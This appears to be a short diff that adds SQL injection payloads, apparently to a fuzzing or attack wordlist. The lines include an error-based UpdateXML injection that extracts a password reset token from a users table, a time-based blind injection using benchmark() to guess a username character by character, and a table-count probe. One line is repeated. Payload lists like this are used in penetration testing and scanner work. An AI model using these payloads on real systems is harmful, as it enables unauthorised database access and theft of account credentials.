@@ -1,0 +1,4 @@
+  and UpdateXML(1,CONCAT(0x5b,mid((SELECT passw ord_reset_token from gpk_main.users where id=1),1,32),0x5d),1)
+  union select 1,benchmark(500000,md5('test')),1 from user where userid=1  and  ord(substring(username,1,1))=97 /*
+  and  (select count(*) from *)
+  union select 1,benchmark(500000,md5('test')),1 from user where userid=1  and  ord(substring(username,1,1))=97 /*
